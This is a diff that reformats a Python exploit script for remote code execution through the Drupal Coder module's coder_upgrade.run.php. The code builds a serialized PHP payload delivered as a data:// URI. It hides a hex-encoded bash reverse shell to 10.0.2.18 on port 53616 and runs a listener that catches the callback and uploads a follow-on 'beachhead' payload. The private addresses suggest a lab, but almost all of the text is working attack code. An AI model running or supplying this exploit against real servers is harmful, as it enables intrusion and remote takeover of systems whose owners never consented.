@@ -1,22 +1,25 @@
-from base64 import b64encode
-import requests
-import threading
 import socket
+import threading
 import time
+from base64 import b64encode
+
+import requests
 
 
 class DrupalCoderExec:
     """Exploit Drupal Coder module to execute arbitrary code on the server"""
 
     # This is a basic bash reverse shell coded into hex and expanded by the perl pack command
-    REV_SHELL = "perl -e 'system(pack(qq,H138,,qq,62617368202D632027303C2632342D3B657865632032343C3E2F6465762F7463702F31302E302E322E31382F35333631363B7368203C263234203E26323420323E26323427,))'\n"
+    REV_SHELL = "perl -e 'system(pack(qq,H138,,qq,62617368202D632027303C2632342D3B657865632032343C"
+    REV_SHELL += "3E2F6465762F7463702F31302E302E322E31382F35333631363B7368203C263234203E26323420323E26323427,))'\n"
 
-    WEBSERVER_PATH = '/sites/all/modules/coder/coder_upgrade/scripts/coder_upgrade.run.php'
+    WEBSERVER_PATH = (
+        "/sites/all/modules/coder/coder_upgrade/scripts/coder_upgrade.run.php"
+    )
 
     def __init__(self, beachhead: str):
-        """Initialize the exploit with the beachhead payload
-        """
-        
+        """Initialize the exploit with the beachhead payload"""
+
         self.beachhead = beachhead
         print("DRUPAL: exploit instantiated")
 
@@ -33,12 +36,14 @@ class DrupalCoderExec:
         will be caught and used to upload the actual beachhead in a later function.
         """
 
-        p = ''
+        p = ""
         p += 'a:6:{s:5:"paths";a:3:{s:12:"modules_base";s:8:"../../..";'
         p += 's:10:"files_base";s:5:"../..";s:14:"libraries_base";s:5:"../..";}'
         p += 's:11:"theme_cache";s:16:"theme_cache_test";'
         p += 's:9:"variables";s:14:"variables_test";'
-        p += 's:8:"upgrades";a:1:{i:0;a:2:{s:4:"path";s:2:"..";s:6:"module";s:3:"foo";}}'
+        p += (
+            's:8:"upgrades";a:1:{i:0;a:2:{s:4:"path";s:2:"..";s:6:"module";s:3:"foo";}}'
+        )
         p += 's:10:"extensions";a:1:{s:3:"php";s:3:"php";}'
         p += 's:5:"items";a:1:{i:0;a:3:{s:7:"old_dir";s:12:"../../images";'
         p += 's:7:"new_dir";s:'
@@ -47,14 +52,14 @@ class DrupalCoderExec:
         p += payload
         p += ' #";s:4:"name";s:4:"test";}}}'
 
-        pl = "data://text/plain;base64," + b64encode(bytes(p, 'utf-8')).decode('utf-8')
+        pl = "data://text/plain;base64," + b64encode(bytes(p, "utf-8")).decode("utf-8")
 
         print("DRUPAL: Reverse shell payload created")
         return pl
-    
+
     def send_beachhead(self, payload: str):
         """Send the beachhead to the server
-        
+
         This function will catch the reverse shell created in create_payload and use it to upload
         the beachhead to the server and run it.
 
@@ -62,9 +67,9 @@ class DrupalCoderExec:
         Once the reverse shell calls back to this function and is received, the beachhead is sent
         and the thread is closed.
         """
-        
-        HOST = ''
-        PORT = 53616   # Hardcoded for now and reflects the port in the reverse shell
+
+        HOST = ""
+        PORT = 53616  # Hardcoded for now and reflects the port in the reverse shell
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.bind((HOST, PORT))
 
@@ -74,7 +79,7 @@ class DrupalCoderExec:
         conn, addr = sock.accept()
         print("DRUPAL: Shell called home")
 
-        conn.sendall(payload.encode('utf-8'))
+        conn.sendall(payload.encode("utf-8"))
         print("DRUPAL: Sent beachhead")
 
         sock.close()
@@ -92,9 +97,9 @@ class DrupalCoderExec:
         print("DRUPAL: Thread started")
         time.sleep(1)
         print("DRUPAL: Sleep over")
-        
+
         url = "http://" + ip_addr + ":" + port + path + self.WEBSERVER_PATH
-        params = { 'file': self.create_payload(self.REV_SHELL) }
+        params = {"file": self.create_payload(self.REV_SHELL)}
         print("DRUPAL: Sending reverse shell")
         requests.get(url=url, params=params)
 
@@ -105,7 +110,7 @@ class DrupalCoderExec:
 
 
 if __name__ == "__main__":
-    with open ('Drupal_TEST.sh', 'r') as f:
+    with open("Drupal_TEST.sh", "r") as f:
         payload = f.read()
     coder_exec = DrupalCoderExec(payload)
-    coder_exec.exploit('10.0.2.46', '80', '/drupal')
+    coder_exec.exploit("10.0.2.46", "80", "/drupal")
